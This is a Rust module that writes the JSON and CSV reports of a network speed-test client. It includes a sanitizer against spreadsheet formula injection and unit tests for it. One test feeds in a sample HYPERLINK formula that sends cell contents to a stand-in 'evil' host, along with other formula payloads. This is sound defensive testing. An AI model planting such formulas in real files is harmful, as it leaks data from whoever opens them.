//! Machine-readable JSON and CSV reports.

use serde::{Serialize, Serializer};

use crate::defs::IPInfoResponse;

/// Serializes a float the way Go's `encoding/json` does, so whole numbers are
/// written as `555` rather than `555.0`.
fn go_float<S: Serializer>(v: &f64, s: S) -> Result<S::Ok, S::Error> {
    if v.is_finite() && v.fract() == 0.0 && v.abs() < 1e15 {
        s.serialize_i64(*v as i64)
    } else {
        s.serialize_f64(*v)
    }
}

/// One `progress` event of the `--json-stream` NDJSON stream.
///
/// Typed rather than formatted by hand so the numbers are rendered the way
/// Go's `encoding/json` renders them: a whole `mbps` is `100`, not `100.00`,
/// and a consumer decoding into an int does not trip over the difference.
#[derive(Serialize)]
pub struct ProgressEvent {
    pub event: &'static str,
    pub phase: &'static str,
    /// Seconds since the phase's clock started, rounded to one decimal.
    #[serde(serialize_with = "go_float")]
    pub seconds: f64,
    /// The rate measured so far, rounded to two decimals.
    #[serde(serialize_with = "go_float")]
    pub mbps: f64,
    /// Percent of the configured duration elapsed, truncated.
    pub progress: u32,
}

/// Serializes a CSV text field, prefixing a leading formula trigger with a
/// single quote so spreadsheet software treats the value as text.
///
/// The csv writer quotes fields containing the delimiter, a quote or a record
/// terminator, but that is not enough on its own: Excel and LibreOffice strip
/// the quotes and then evaluate anything starting with `=`, `+`, `-`, `@`, TAB
/// or CR. Server names and addresses come off the wire, so a hostile server
/// list can plant a formula that fires when the report is opened.
fn csv_text<S: Serializer>(v: &str, s: S) -> Result<S::Ok, S::Error> {
    if v.starts_with(['=', '+', '-', '@', '\t', '\r']) {
        s.serialize_str(&format!("'{v}"))
    } else {
        s.serialize_str(v)
    }
}

/// Formats a timestamp the way Go's `time.Time` marshals to JSON (RFC 3339 with
/// fractional seconds, trailing zeros removed).
pub fn timestamp_now() -> String {
    chrono::Local::now().to_rfc3339_opts(chrono::SecondsFormat::AutoSi, false)
}

/// The speed test server's information in a JSON report.
#[derive(Debug, Default, Serialize)]
pub struct ReportServer {
    pub name: String,
    pub url: String,
}

/// The speed test client's information in a JSON report.
#[derive(Debug, Default, Serialize)]
pub struct Client {
    #[serde(flatten)]
    pub ip_info: IPInfoResponse,
}

/// The output data fields of a JSON report.
#[derive(Debug, Default, Serialize)]
pub struct JSONReport {
    pub timestamp: String,
    pub server: ReportServer,
    pub client: Client,
    pub bytes_sent: u64,
    pub bytes_received: u64,
    #[serde(serialize_with = "go_float")]
    pub ping: f64,
    #[serde(serialize_with = "go_float")]
    pub jitter: f64,
    #[serde(serialize_with = "go_float")]
    pub upload: f64,
    #[serde(serialize_with = "go_float")]
    pub download: f64,
    pub share: String,

    /// What the connection to the server negotiated, absent over plain HTTP.
    /// On hardware without AES acceleration the cipher, not the link, can
    /// bound the result, and under TLS 1.3 the server picks it -- so two
    /// otherwise identical runs can differ several-fold for a reason the
    /// numbers alone do not show.
    ///
    /// Read from the backend probe, as the Go client reads it: the transfer
    /// phases open further connections, which a server is free to negotiate
    /// differently.
    #[serde(skip_serializing_if = "Option::is_none")]
    pub tls: Option<TLSReport>,
}

/// The negotiated TLS parameters a measurement ran over.
#[derive(Debug, Serialize)]
pub struct TLSReport {
    pub version: String,
    pub cipher: String,
}

/// The output data fields of a CSV report.
#[derive(Debug, Default, Serialize)]
pub struct CSVReport {
    #[serde(rename = "Timestamp")]
    pub timestamp: String,
    #[serde(rename = "Server Name", serialize_with = "csv_text")]
    pub name: String,
    #[serde(rename = "Address", serialize_with = "csv_text")]
    pub address: String,
    #[serde(rename = "Ping", serialize_with = "go_float")]
    pub ping: f64,
    #[serde(rename = "Jitter", serialize_with = "go_float")]
    pub jitter: f64,
    #[serde(rename = "Download", serialize_with = "go_float")]
    pub download: f64,
    #[serde(rename = "Upload", serialize_with = "go_float")]
    pub upload: f64,
    #[serde(rename = "Share", serialize_with = "csv_text")]
    pub share: String,
    #[serde(rename = "IP", serialize_with = "csv_text")]
    pub ip: String,
}

/// The CSV column names, in order.
pub const CSV_HEADERS: [&str; 9] = [
    "Timestamp",
    "Server Name",
    "Address",
    "Ping",
    "Jitter",
    "Download",
    "Upload",
    "Share",
    "IP",
];

fn writer(delimiter: u8) -> csv::Writer<Vec<u8>> {
    csv::WriterBuilder::new()
        .delimiter(delimiter)
        .from_writer(Vec::new())
}

/// Renders just the CSV header row, for `--csv-header`.
pub fn csv_header(delimiter: u8) -> anyhow::Result<String> {
    let mut w = writer(delimiter);
    w.write_record(CSV_HEADERS)?;
    Ok(String::from_utf8(w.into_inner()?)?)
}

/// Renders CSV rows without a header, terminated by exactly one newline.
///
/// The line endings the writer produced are normalised away first, so the
/// result is one newline whatever the writer emitted. `--csv-header` ends with
/// one too, which is what lets the two modes be concatenated into a file a CSV
/// reader will accept.
pub fn csv_rows(reports: &[CSVReport], delimiter: u8) -> anyhow::Result<String> {
    let mut w = csv::WriterBuilder::new()
        .delimiter(delimiter)
        .has_headers(false)
        .from_writer(Vec::new());

    for rep in reports {
        w.serialize(rep)?;
    }

    let out = String::from_utf8(w.into_inner()?)?;
    Ok(format!("{}\n", out.trim_end_matches(['\n', '\r'])))
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn header_uses_the_configured_delimiter() {
        assert_eq!(
            csv_header(b',').unwrap().trim_end(),
            "Timestamp,Server Name,Address,Ping,Jitter,Download,Upload,Share,IP"
        );
        assert_eq!(
            csv_header(b';').unwrap().trim_end(),
            "Timestamp;Server Name;Address;Ping;Jitter;Download;Upload;Share;IP"
        );
    }

    #[test]
    fn rows_quote_embedded_delimiters_and_end_with_one_newline() {
        let rep = CSVReport {
            timestamp: "2026-08-06T15:41:36.067293+02:00".into(),
            name: "Prague, Czech Republic (CESNET)".into(),
            address: "https://speedtest.cesnet.cz".into(),
            ping: 6.36,
            jitter: 0.82,
            download: 228.39,
            upload: 553.97,
            ..Default::default()
        };
        let out = csv_rows(&[rep], b',').unwrap();
        assert_eq!(
            out,
            "2026-08-06T15:41:36.067293+02:00,\"Prague, Czech Republic (CESNET)\",https://speedtest.cesnet.cz,6.36,0.82,228.39,553.97,,\n"
        );
    }

    #[test]
    fn rows_defuse_spreadsheet_formulas_in_server_supplied_fields() {
        let rep = CSVReport {
            timestamp: "2026-08-06T15:41:36.067293+02:00".into(),
            name: "=HYPERLINK(\"http://evil/?x=\"&A1,\"Result\")".into(),
            address: "@SUM(1+1)".into(),
            share: "-2+3".into(),
            ip: "\t=cmd".into(),
            ..Default::default()
        };
        let out = csv_rows(&[rep], b',').unwrap();
        // Every attacker-controlled field is prefixed, so nothing evaluates.
        assert!(out.contains("\"'=HYPERLINK(\"\"http://evil/?x=\"\"&A1,\"\"Result\"\")\""));
        assert!(out.contains(",'@SUM(1+1),"));
        assert!(out.contains(",'-2+3,"));
        // A TAB needs no CSV quoting under a ',' delimiter, so the prefix on
        // its own is what stops the evaluation here.
        assert!(out.ends_with(",'\t=cmd\n"));
        // A benign value is untouched.
        assert!(!csv_rows(
            &[CSVReport {
                name: "CESNET".into(),
                ..Default::default()
            }],
            b','
        )
        .unwrap()
        .contains('\''));
    }
}
